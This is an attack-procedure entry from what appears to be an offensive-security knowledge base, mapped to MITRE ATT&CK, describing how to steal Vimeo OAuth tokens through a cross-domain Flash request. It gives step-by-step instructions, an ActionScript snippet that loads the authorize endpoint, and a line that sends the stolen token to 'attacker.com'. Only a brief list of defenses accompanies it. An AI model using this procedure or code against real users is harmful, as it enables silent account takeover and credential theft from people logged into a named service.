---
id: proc-steal-oauth-token-flash
tags:
  - token-theft
  - csrf
  - cross-domain-request
type: procedure
tools:
  - '[[tools/Adobe-Flash-SWF]]'
tactics:
  - '[[Credential Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Credentials In Files]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:29:56.772Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Credentials In Files]]'
  - '[[Exploit Public-Facing Application]]'
---
# Steal-OAuth-Token-via-Cross-Domain-Flash-Request

## Summary

This procedure exploits the loaded cross-domain policy to make a Flash request to Vimeo's /oauth/authorize endpoint, reading the OAuth token from the response without user interaction.

## Description

With the permissive policy active, the SWF performs a cross-domain GET to https://api.vimeo.com/oauth/authorize, which returns the token in the victim's session context. Due to lack of CSRF protection, the token is stolen silently. This targets logged-in users, leading to full app privileges. Outcome: Attacker obtains the authorization token.

## Requirements

1. Policy loaded from previous step
2. SWF with URLLoader capabilities
3. Victim's active Vimeo session
4. Attacker server to exfiltrate token

## Defense

Defensive measures and detection strategies:

- Add CSRF tokens to OAuth endpoints
- Restrict cross-domain access via CORS and policy files
- Log and alert on anomalous Flash requests to API
- Deprecate Flash and migrate to modern auth (e.g., PKCE)

## Objectives

1. Access sensitive OAuth endpoint cross-domain
2. Extract authorization token from response
3. Exfiltrate token for further use

## Instructions

### Step 1: Implement Token Request in SWF

**Context**: Code the SWF to load the authorize endpoint.

In ActionScript:

```actionscript
import flash.net.URLLoader;
import flash.net.URLRequest;
var loader:URLLoader = new URLLoader();
loader.load(new URLRequest('https://api.vimeo.com/oauth/authorize'));
loader.addEventListener(Event.COMPLETE, onComplete);
function onComplete(e:Event):void {
    var token = loader.data; // Parse token
    // Exfil to attacker server
}
```

> This reads the response containing the token.

### Step 2: Parse and Exfil Token

**Context**: Extract token from XML/HTML response.

Use string parsing to isolate token value.

> Send via URLLoader to attacker's endpoint, e.g., new URLRequest('http://attacker.com/steal?token=' + token).

### Step 3: Verify Theft

**Context**: Confirm token validity.

Test token in a separate API call.

> Success if token authorizes requests.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]]

### Techniques

- [[Credentials In Files]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Adobe-Flash-SWF]]

## Tags

- token-theft
- csrf
- cross-domain-request
